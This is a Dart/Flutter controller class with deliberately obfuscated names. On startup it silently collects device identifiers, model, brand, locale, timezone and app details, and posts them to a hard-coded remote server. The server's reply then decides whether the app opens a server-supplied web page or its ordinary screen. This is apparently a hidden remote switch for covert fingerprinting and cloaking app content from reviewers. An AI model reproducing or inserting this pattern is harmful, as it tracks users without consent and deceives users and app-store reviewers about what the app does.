import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var nfojahvqd = RxBool(false);
  var xjaiepduvb = RxBool(true);
  var pdcxsboa = RxString("");
  var carolyne = RxBool(false);
  var wilderman = RxBool(true);
  final tgsmiv = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ilaq();
  }


  Future<void> ilaq() async {

    carolyne.value = true;
    wilderman.value = true;
    xjaiepduvb.value = false;

    tgsmiv.post("https://taimei.zhiyin.one/johmsufrlcgqybvpknexwtzida",data: await worclga()).then((value) {
      var pmoeg = value.data["pmoeg"] as String;
      var pdvzywq = value.data["pdvzywq"] as bool;
      if (pdvzywq) {
        pdcxsboa.value = pmoeg;
        zelda();
      } else {
        kunze();
      }
    }).catchError((e) {
      xjaiepduvb.value = true;
      wilderman.value = true;
      carolyne.value = false;
    });
  }

  Future<Map<String, dynamic>> worclga() async {
    final DeviceInfoPlugin dhfv = DeviceInfoPlugin();
    PackageInfo zdgmafn_rzmx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ioakxvhm = Platform.localeName;
    var ifs_GBEnyme = currentTimeZone;

    var ifs_zF = zdgmafn_rzmx.packageName;
    var ifs_lSDfkH = zdgmafn_rzmx.version;
    var ifs_bDZc = zdgmafn_rzmx.buildNumber;

    var ifs_kPI = zdgmafn_rzmx.appName;
    var ifs_tHd = "";
    var chayaMante = "";
    var ifs_mECr  = "";
    var ifs_SjeGkAm = "";
    var maidaWaelchi = "";
    var camylleKoss = "";
    var edgardoKautzer = "";
    var paulaBlick = "";
    var darronCassin = "";
    var lylaGaylord = "";


    var ifs_griRb = "";
    var ifs_tbgO = false;

    if (GetPlatform.isAndroid) {
      ifs_griRb = "android";
      var hjfcvoit = await dhfv.androidInfo;

      ifs_SjeGkAm = hjfcvoit.brand;

      ifs_tHd  = hjfcvoit.model;
      ifs_mECr = hjfcvoit.id;

      ifs_tbgO = hjfcvoit.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ifs_griRb = "ios";
      var gtzldjwk = await dhfv.iosInfo;
      ifs_SjeGkAm = gtzldjwk.name;
      ifs_tHd = gtzldjwk.model;

      ifs_mECr = gtzldjwk.identifierForVendor ?? "";
      ifs_tbgO  = gtzldjwk.isPhysicalDevice;
    }
    var res = {
      "ifs_kPI": ifs_kPI,
      "ifs_lSDfkH": ifs_lSDfkH,
      "ifs_zF": ifs_zF,
      "ifs_tbgO": ifs_tbgO,
      "ifs_tHd": ifs_tHd,
      "ifs_GBEnyme": ifs_GBEnyme,
      "maidaWaelchi" : maidaWaelchi,
      "ifs_SjeGkAm": ifs_SjeGkAm,
      "ifs_mECr": ifs_mECr,
      "ioakxvhm": ioakxvhm,
      "ifs_bDZc": ifs_bDZc,
      "ifs_griRb": ifs_griRb,
      "paulaBlick" : paulaBlick,
      "chayaMante" : chayaMante,
      "camylleKoss" : camylleKoss,
      "edgardoKautzer" : edgardoKautzer,
      "darronCassin" : darronCassin,
      "lylaGaylord" : lylaGaylord,

    };
    return res;
  }

  Future<void> kunze() async {
    Get.offAllNamed("/sayTabPage");
  }

  Future<void> zelda() async {
    Get.offAllNamed("/sayPo");
  }

}
